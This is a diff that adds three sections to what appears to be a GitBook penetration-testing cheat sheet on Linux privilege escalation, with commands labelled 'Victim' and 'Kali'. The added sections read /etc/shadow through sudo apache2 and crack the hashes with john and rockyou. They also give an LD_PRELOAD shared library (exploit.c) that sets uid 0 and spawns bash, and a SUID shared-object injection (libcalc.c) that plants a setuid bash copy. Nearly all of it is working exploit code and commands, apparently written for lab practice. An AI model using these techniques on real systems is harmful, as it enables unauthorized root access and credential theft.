@@ -234,15 +234,116 @@ sudo vim -c '!sh'
 
 <figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
+## Privilege Escalation - Sudo (Abusing Intended Functionality)
+
+**Victim**
+
+```
+ sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+ sudo apache2 -f /etc/shadow
+```
+
+<figure><img src="../../.gitbook/assets/image (853).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+ john hash.txt --show
+```
+
+<figure><img src="../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation - Sudo (LD\_PRELOAD)
+
+**Victim**
+
+```
+ sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**exploit.c**
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+**Victim**
+
+```
+gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
+sudo LD_PRELOAD=/tmp/exploit.so apache2
+```
+
+<figure><img src="../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation - SUID (Shared Object Injection)
 
 
 
+**Victim**
 
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
 
+<figure><img src="../../.gitbook/assets/image (856).png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
 
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+```
 
+<figure><img src="../../.gitbook/assets/image (857).png" alt=""><figcaption></figcaption></figure>
 
+**Victim**
+
+```
+mkdir /home/user/.config
+cd /home/user/.config
+vi libcalc.c
+```
+
+**libcalc.c**
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+**Victim**
+
+```
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+/usr/local/bin/suid-so
+```
+
+<figure><img src="../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>
 
 
 
